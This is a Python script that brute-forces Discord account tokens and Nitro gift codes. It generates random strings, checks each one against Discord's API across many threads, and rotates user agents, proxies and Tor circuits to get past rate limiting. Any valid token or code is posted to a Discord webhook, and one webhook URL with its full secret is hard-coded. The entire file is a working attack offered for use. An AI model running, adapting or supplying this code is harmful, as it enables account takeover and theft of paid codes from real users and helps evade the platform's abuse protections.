import random
import string
import requests
import threading
import time
from stem import Signal
from stem.control import Controller
import dhooks

char = string.ascii_letters + string.digits + "-" + "_"
tokenAPI = "https://discordapp.com/api/v9/users/@me/library"
nitroAPI = 'https://discordapp.com/api/v9/entitlements/gift-codes/'

userAgents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.119 Safari/537.36",
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',
 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)']

h = {
        'Content-Type': 'application/json'
    }
nitro_h = {
        'Host': 'discordapp.com',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive'
    }
def renew_tor_proxy():
    for l in open(location, 'rt'):
        l = l.replace('\n', '')
        if l == '':
            continue
        control_port = int(l.split(':')[-1]) + 1
        with Controller.from_port(port=control_port) as c:
            c.authenticate()
            c.signal(Signal.NEWNYM)
        print('Renewed tor proxy on source port', control_port-1)
        time.sleep(1)

def checkToken(token):
    global h
    h['authorization'] = token
    h['User-Agent'] = random.choice(userAgents)
    if use_proxies and len(proxies) > 0 and proxy_type and location:
        reqToken = None
        for prox in proxies:
            try:
                reqToken = requests.get(proxies=prox, url=tokenAPI, headers=h, timeout=10)
            except Exception as e:
                print('Token: Error - ', e)
                continue
        if not reqToken:
            reqToken = requests.get(url=tokenAPI, headers=h)
    else:
        reqToken = requests.get(url=tokenAPI, headers=h)
    if reqToken.status_code == 404:
        print(f"Token: API is invalid: {tokenAPI}")
    elif reqToken.status_code == 429:
        print("Token: Rate Limited")
    elif reqToken.status_code == 200:
        dhooks.Webhook('Your Webhook').send(token)
        print(f"Token: Valid - {token}")
    else:
        print(f"Token: Invalid - {token}")
    time.sleep(2)


def generateToken():
    firstPart = "".join((random.choice(char)) for i in range(24))
    secondPart = "".join((random.choice(char)) for i in range(6))
    thirdPart = "".join((random.choice(char)) for i in range(27))
    token = firstPart + "." + secondPart + "." + thirdPart
    authToken = "mfa." + token
    checkToken(token)
    checkToken(authToken)

def generateNitro():
    global nitro_h
    nitro_h["User-Agent"] = random.choice(userAgents)
    nitro1 = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(19))
    nitro2 = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16))
    if use_proxies and len(proxies) > 0 and proxy_type and location:
        for prox in proxies:
            try:
                #ii_proxy_ip = requests.get(proxies=prox, url='https://api.ipify.org').text
                #print(ii_proxy_ip)
                urlNitro1 = requests.get(proxies=prox, url=nitroAPI + nitro1 + "?with_application=false&with_subscription_plan=true", timeout=10, headers=h)
                urlNitro2 = requests.get(proxies=prox, url=nitroAPI + nitro2 +'?with_application=false&with_subscription_plan=true', timeout=10, headers=h)
            except Exception as e:
                print('Nitro: Error - ', e)
                continue
            else:
                 if not urlNitro1:
                     urlNitro1 = requests.get(url=nitroAPI + nitro1, timeout=10, headers=h)
                 if not urlNitro2:
                     urlNitro2 = requests.get(url=nitroAPI + nitro2, timeout=10, headers=h)
                 if urlNitro1.status_code == 200 or urlNitro2.status_code == 200:
                     dhooks.Webhook('https://discord.com/api/webhooks/1025412804506820658/OZ0BTZ7kehRszx25Y9e3dqLEszy8ggM_ZXmtRDc2ZOr7P1K02ajXsW6AjccNUCjzjF9z').send(nitro1+' or '+nitro2)
                     c = nitro1 if urlNitro1.status_code == 200 else nitro2
                     t = urlNitro1.text if urlNitro1.status_code == 200 else urlNitro2.text
                     print(f'Nitro: Valid nitro - https://discord.gift/{c} - Request code 200')
                     print(t)
                 elif urlNitro1.status_code == 429 or urlNitro2.status_code == 429:
                     print("Nitro: Rate Limited - Error Code 429")
                 else:
                     print(f"Nitro: Invalid - https://discord.gift/{nitro1} - Error Code: {urlNitro1.status_code}")
                     print(f"Nitro: Invalid - https://discord.gift/{nitro2} - Error Code: {urlNitro2.status_code}")
                 time.sleep(2)
    else:
        urlNitro1 = requests.get(url=nitroAPI + nitro1, timeout=10, headers=h)
        urlNitro2 = requests.get(url=nitroAPI + nitro2, timeout=10, headers=h)
        if urlNitro1.status_code == 200 or urlNitro2.status_code == 200:
            dhooks.Webhook('Your Webhook')\
            .send(nitro1+' or '+nitro2)
            c = nitro1 if urlNitro1.status_code == 200 else nitro2
            t = urlNitro1.text if urlNitro1.status_code == 200 else urlNitro2.text
            print(f'Nitro: Valid nitro - https://discord.gift/{c} - Request code 200')
            print(t)
        elif urlNitro1.status_code == 429 or urlNitro2.status_code == 429:
            print("Nitro: Rate Limited - Error Code 429")
        else:
            print(f"Nitro: Invalid - https://discord.gift/{nitro1} - Error Code: {urlNitro1.status_code}")
            print(f"Nitro: Invalid - https://discord.gift/{nitro2} - Error Code: {urlNitro2.status_code}")
        time.sleep(2)

def run(use_proxies1: bool, location1: str, proxy_type1: str, amount_threads1: int):
    global proxies
    global amount_threads
    global location
    global use_proxies
    global proxies
    global proxy_type
    proxy_type = proxy_type1
    use_proxies = use_proxies1
    location = location1
    amount_threads = amount_threads1
    proxies1 = []
    if use_proxies and location and proxy_type:
        for line3 in open(location, 'rt'):
            ip3 = line3.replace('\n', '')
            if ip3 == '':
                continue
            else:
                prox1233 = proxy_type + '://' + ip3
                proxies1.append({'http': prox1233, 'https': prox1233})
    proxies = proxies1
    while True:
        try:
            if threading.active_count() == 1:
                if use_proxies and len(proxies) > 0 and proxy_type and location:
                    renew_tor_proxy()
                for th in range(amount_threads):
                    threading.Thread(target=generateNitro, daemon=True).start()
                    threading.Thread(target=generateToken, daemon=True).start()
        except KeyboardInterrupt:
                print("CTRL + C - Detected")
                break


if __name__ == '__main__':
    use_proxies = input('[?] Do you want to use proxies? (Y)es / (N)o >> ').lower()
    while True:
        amount_threads = input('[?] How many threads? 50: Ok | 100: a lot | 200: may crash your pc >> ')
        if amount_threads != "" and amount_threads.isdigit():
            amount_threads = int(amount_threads)
            break
    use_proxies = True if use_proxies == "y" or use_proxies == 'yes' else False
    proxies = []
    proxy_type = None
    location = None
    if use_proxies:
        while True:
            file_name = input("[?] Proxies file location | .txt format expected! |\n"
                              "Example of the proxies in the file:\n"
                              " localhost:8080\n"
                              " username:password@123.156.89:443\n"
                              " 141.51.133:80\n"
                              "You should also specify the type of the proxy by default it is HTTP\n"
                              "Example:\n"
                              " /my_proxies/proxies.txt http\n"
                              "->> ")
            if file_name != '':
                if ' ' in file_name:
                    try:
                        location, proxy_type = file_name.split(' ')
                        proxy_type = proxy_type.lower()
                    except Exception as e:
                        print('Error -', e)
                        exit()
                else:
                    proxy_type = 'http'
                    location = file_name
                for line in open(location, 'rt'):
                    ip = line.replace('\n', '')
                    if ip == '':
                        continue
                    else:
                        prox123 = proxy_type + '://' + ip
                        proxies.append({'http': prox123, 'https': prox123})
                break


    while True:
        try:
            if threading.active_count() == 1:
                if use_proxies and len(proxies) > 0 and proxy_type and location:
                    renew_tor_proxy()
                for th in range(amount_threads):
                    threading.Thread(target=generateNitro, daemon=True).start()
                    threading.Thread(target=generateToken, daemon=True).start()
        except KeyboardInterrupt:
                print("CTRL + C - Detected")
                break

